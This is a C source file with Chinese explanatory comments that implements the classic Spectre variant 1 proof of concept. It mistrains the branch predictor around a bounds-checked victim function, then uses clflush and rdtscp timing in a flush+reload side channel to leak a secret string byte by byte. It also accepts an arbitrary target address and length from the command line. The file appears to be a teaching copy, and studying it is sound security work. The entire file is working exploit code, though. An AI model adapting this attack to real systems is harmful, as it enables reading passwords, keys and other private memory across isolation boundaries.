#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

/********************************************************************
受害者代码
********************************************************************/
unsigned int array1_size = 16;

//在array1前后各定义64字节未使用内存空间
uint8_t unused1[64];

//uint8_t 定义array1的每个元素1字节，memory中一个地址空间存储 1 byte，即8 bits数据，对应一个ASCII值
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};

uint8_t unused2[64];

//cache line = 64 bytes = 512 bits
//256个cache line
uint8_t flush_reload_buffer[256 * 512];

//秘密信息：target
char* secret = "the secret is Peking university,let's try to read the secret";

//将temp变量定义在函数外面,使编译器不会优化victom_function()
uint8_t temp = 0;

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		//这里flush_reload_buffer的值也不重要，只要操作将flush_reload_buffer[array1[x]*512]写入cache即可。
		temp &= flush_reload_buffer[array1[x] * 512];
	}
}


/********************************************************************
分析代码
********************************************************************/

//设置cache hit的周期阈值
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

//最优guess：value[0]，次优guess：value[1]
void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int score[2])
{
	static int results[256];

	int tries, i, j, k, mix_i;

	unsigned int junk = 0;

	//size_t training_x, x;
	unsigned long training_x, x;

	register unsigned long time1, time2;

	volatile unsigned char* addr;//volatile关键字提醒编译器不要优化该变量，而是直接从内存地址读取数据

	for (i = 0; i < 256; i++)
        results[i] = 0;

	for (tries = 999; tries > 0; tries--)
	{
		//uint8_t array2[256 * 512];clflush m8：清除包含地址m8的cache line。
		for (i = 0; i < 256; i++)
			_mm_clflush(&flush_reload_buffer[i * 512]);
		//30次循环：每训练5次(x=training_x)，攻击1次(x=malicious_x)。array1_size=16
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{ 
			//从cache中驱逐array1_size
			_mm_clflush(&array1_size);
			//延迟，也可以使用mfence，这一部分是必须的，删除后会攻击失败。

			//mfence:保证内存访问(读/)的串行化，内部操作就是在一系列内存访问中添加若干延迟，
			//保证此指令之后的内存访问发生在此指令之前的内存访问完成之后（不出现重叠）
			for (volatile int z = 0; z < 100; z++)
			{
				/* Delay (can also mfence) */
			} 
			
			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			//j x x x对应输出：29 0 0 training_x,28 0 0 training_x,...,24 -65536 -1 malicious_x,...

			//这部分逻辑就是控制5次training_x，1次malicious_x
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));
			/* Call the victim! */
			victim_function(x);
		}


		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			//mix_i随机取遍0~255，为了防止stride prediction，对顺序轻微混淆
			mix_i = ((i * 167) + 13) & 255;
			addr = &flush_reload_buffer[mix_i * 512];

			//开始计时
			time1 = __rdtscp(&junk); /* READ TIMER */
			//访问flush_reload_buffer[mix_i * 512]
			junk = *addr; /* MEMORY ACCESS TO TIME */

			//结束计时&计算访问时间
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

			//若访问时间小于cache hit阈值，array1[malicious_x]=mix_i的分数+1
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		//最优/次优结果：j/k
		j = k = -1;
		
		//每一轮都对result[255]进行一次
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				//将最大值赋给j，次大值赋给k
				k = j;j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		//判断是否需要提前终止比较，可以删除
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}


int main(int argc, const char** argv)
{
	printf("main process:\n");
	printf("将秘密值 【%s】 放置在内存中，其秘密值存放地址:【%p】\n", secret, (void *)(secret));
	//初始化malicious_x，其初值为secret与array1的地址差值
	//secret：0x55fbca790f28，array1：0x55fbca992040
	//malicious_x=0x55fbca790f28-0x55fbca992040 = -2101544
	//此外flush_reload_buffer地址：0x558df22cc580，
	//unused1：0x560c3d0ba540
	//unused2：0x556f96926580
	
	//获取偏移量，也就是预测执行将要读取的地方
	size_t malicious_x = (size_t)(secret - (char *)array1); 

	//最优guess[0]对应的分数：score[0]
	int score[2], len = strlen(secret);
	//最优guess：value[0]，次优guess：value[1]
	uint8_t value[2];

	for (size_t i = 0; i < sizeof(flush_reload_buffer); i++)
		flush_reload_buffer[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	//若给主程序三个参数
	if (argc == 3)
	{
		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */

		sscanf_s(argv[2], "%d", &len);
		printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
	}//if argc==3

	printf("共读取 %d 字节:\n", len);
	while (--len >= 0)
	{
		//最初malicious_x=-2101544，转2进制10 0000 0001 0001 0010 1000
		//取补码：1101 1111 1110 1110 1101 1000，即0xffffffffffdfeed8

		printf("读取恶意偏移量(-malicious_x-) 【%p】 ", (void *)malicious_x);
		//依次对所有字节发起攻击
		readMemoryByte(malicious_x++, value, score);

		printf("%s: ", (score[0] >= 2 * score[1] ? "成功" : "不明"));

		//输出value[0]的值，value[0]为字符对应的ASCII码，字符有效则输出，无效则'?'。
		printf("0x%02X='%c' score=%d ", value[0], 
										(value[0] > 31 && value[0] < 127 ? value[0] : '?'),
										score[0] );

		if (score[1] > 0)
			printf("(2nd best: 0x%02X='%c' score=%d)\n",
				value[1],
				(value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				score[1]);
	}

#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	return (0);
}